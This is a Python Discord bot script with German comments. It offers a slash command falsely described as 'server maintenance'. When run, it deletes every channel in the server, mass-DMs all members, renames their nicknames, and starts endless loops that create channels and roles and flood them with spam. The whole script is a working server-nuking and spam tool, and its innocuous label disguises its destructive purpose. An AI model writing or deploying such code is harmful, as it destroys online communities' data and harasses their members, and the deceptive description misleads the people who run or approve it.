import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import random
import string

# Gib hier deinen Bot-Token ein:
TOKEN = input("Bitte gib deinen Discord-Bot-Token ein: ").strip()
if not TOKEN:
    raise RuntimeError("Kein Token eingegeben. Beende das Programm.")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.tree.command(
    name="fart",
    description="Trigger a full server maintenance routine"
)
@app_commands.describe(
    announcement="Announcement to send to all members and channels",
    channel_prefix="Prefix for new channels",
    nickname_prefix="Prefix for member nicknames",
    action_delay="Delay (seconds) between creations"
)
@app_commands.checks.has_permissions(administrator=True)
async def fart(
    interaction: discord.Interaction,
    announcement: str,
    channel_prefix: str,
    nickname_prefix: str,
    action_delay: float = 1.0
):
    await interaction.response.send_message(
        "🚀 Maintenance started. Check your DMs for details.",
        ephemeral=True
    )
    guild = interaction.guild
    caller = interaction.user

    # 1) Alle bestehenden Channels löschen
    await caller.send("🔄 Deleting existing channels before starting spam...")
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
        await asyncio.sleep(action_delay)

    # 2) Alle Mitglieder holen (für DMs & Nick-Updates)
    members = []
    async for m in guild.fetch_members(limit=None):
        members.append(m)

    # 3) Nur an den Ausführenden: Zusammenfassung senden
    await caller.send(
        f"Server maintenance parameters:\n"
        f"- Announcement: `{announcement}`\n"
        f"- Channel prefix: `{channel_prefix}`\n"
        f"- Nickname prefix: `{nickname_prefix}`\n"
        f"- Creation delay: `{action_delay}s`\n\n"
        "Background tasks are now running: channel & role spam, plus announcements and nick updates."
    )

    # 4) An alle anderen Mitglieder: nur die Announcement-DM
    async def announce_to_members():
        for member in members:
            if member.bot or member.id == caller.id:
                continue
            try:
                await member.send(announcement)
            except:
                pass
            await asyncio.sleep(action_delay)
    bot.loop.create_task(announce_to_members())

    # 5) Einmalige Nick-Updates
    async def update_nicks():
        for member in members:
            if member.bot:
                continue
            try:
                await member.edit(nick=f"{nickname_prefix}{member.name}")
            except:
                pass
            await asyncio.sleep(action_delay)
    bot.loop.create_task(update_nicks())

    # 6) Channel- und Role-Spam & Direkt-Nachricht in jedem neuen Channel
    new_channels: list[discord.TextChannel] = []
    async def channel_and_role_spam():
        counter = 1
        while True:
            # Neuen Channel erstellen
            name = f"{channel_prefix}-{counter}"
            try:
                chan = await guild.create_text_channel(name)
                new_channels.append(chan)
                # Sofort post announcement
                await chan.send(announcement)
            except:
                pass

            # Neue Rolle erstellen
            tag = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
            try:
                await guild.create_role(name=tag)
            except:
                pass

            counter += 1
            await asyncio.sleep(action_delay)
    bot.loop.create_task(channel_and_role_spam())

    # 7) Fortlaufendes Spam in allen erstellten Channels
    async def spam_in_channels():
        while True:
            for ch in list(new_channels):
                try:
                    await ch.send(announcement)
                except:
                    pass
            await asyncio.sleep(action_delay)
    bot.loop.create_task(spam_in_channels())

@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"Bot ist online als {bot.user}")

if __name__ == "__main__":
    bot.run(TOKEN)
